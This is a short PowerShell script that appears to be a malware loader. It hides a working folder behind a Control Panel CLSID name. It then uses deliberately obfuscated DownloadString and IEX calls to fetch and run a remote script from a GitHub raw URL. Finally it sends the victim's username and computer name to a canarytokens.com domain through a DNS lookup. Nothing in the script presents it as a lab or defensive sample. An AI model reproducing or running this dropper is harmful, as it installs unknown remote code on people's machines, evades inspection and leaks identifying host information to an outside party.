$rdir = "C:\Users\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}\trick"

New-Item -ItemType Directory -Path $dir

cd $dir

$shellcode = "https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/output.ps1"
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
$process = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
Wait-Process -Id $process.Id


$u = ("u$env:username" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
$c = ("c$env:computername" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
$id = ""
1..8 | ForEach-Object { $id += ([Char[]] "abcdefhijklmnonpqrstuvwxyz0123456789" | Get-Random) }
Resolve-DnsName -Name "$c.UN.$u.CMD.$id.ocsl48dyskzry0kauj0mh8li3.canarytokens.com"
